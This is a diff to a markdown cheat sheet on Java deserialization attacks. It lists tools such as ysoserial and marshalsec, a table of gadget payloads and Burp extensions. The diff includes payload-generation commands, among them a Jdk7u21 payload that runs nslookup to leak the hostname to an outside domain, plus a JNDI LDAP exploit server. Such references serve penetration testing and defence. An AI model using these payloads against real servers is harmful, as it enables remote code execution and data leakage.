@@ -9,17 +9,20 @@
 - Content-type = "application/x-java-serialized-object"
 - `"H4sIAAAAAAAAAJ"` in gzip(base64)
 
-## Exploit
+## Tools
+
+### Ysoserial
 
 [frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
 ```java
 java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
 java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' > payload.bin
+java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
 java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
 ```
 
+**List of payloads included in ysoserial:**
 ```ps1
 Payload             Authors                                Dependencies                                                                                                                                                                                        
 -------             -------                                ------------                                                                                                                                                                                        
@@ -59,7 +62,7 @@ Vaadin1             @kai_ullrich                           vaadin-server:7.7.14,
 Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4   
 ```
 
-## Burp extensions using ysoserial
+### Burp extensions using ysoserial
 
 - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
 - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
@@ -67,24 +70,26 @@ Wicket1             @jacob-baines                          wicket-util:6.23.0, s
 - [SuperSerial](https://github.com/DirectDefense/SuperSerial)
 - [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)
 
-## Other tools
+### Alternative Tooling
 
-- [JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)
-- [JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
-- [ysoserial-modified](https://github.com/pimps/ysoserial-modified)
-- [gadgetprobe](https://labs.bishopfox.com/gadgetprobe)
-- [marshalsec](https://github.com/mbechler/marshalsec) - Turning your data into code execution
+- [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)
+- [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
+- [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified)
+- [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
+- [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
+- [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe)
+- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Turning your data into code execution
 
 ```java
-$ java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
-$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
+$ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
+$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
 
- where
-  -a - generates/tests all payloads for that marshaller
-  -t - runs in test mode, unmarshalling the generated payloads after generating them.
-  -v - verbose mode, e.g. also shows the generated payload in test mode.
-  gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
-  arguments - Gadget specific arguments
+-a - generates/tests all payloads for that marshaller
+-t - runs in test mode, unmarshalling the generated payloads after generating them.
+-v - verbose mode, e.g. also shows the generated payload in test mode.
+gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
+arguments - Gadget specific arguments
 ```
 
 Payload generators for the following marshallers are included:<br />
@@ -104,6 +109,13 @@ Payload generators for the following marshallers are included:<br />
 | SnakeYAML                       | **JDK only RCEs**
 | XStream                         | **JDK only RCEs**
 | YAMLBeans                       | third party RCE
+
+## Gadgets
+
+Require:
+* `java.io.Serializable`
+
+
 
 
 ## References
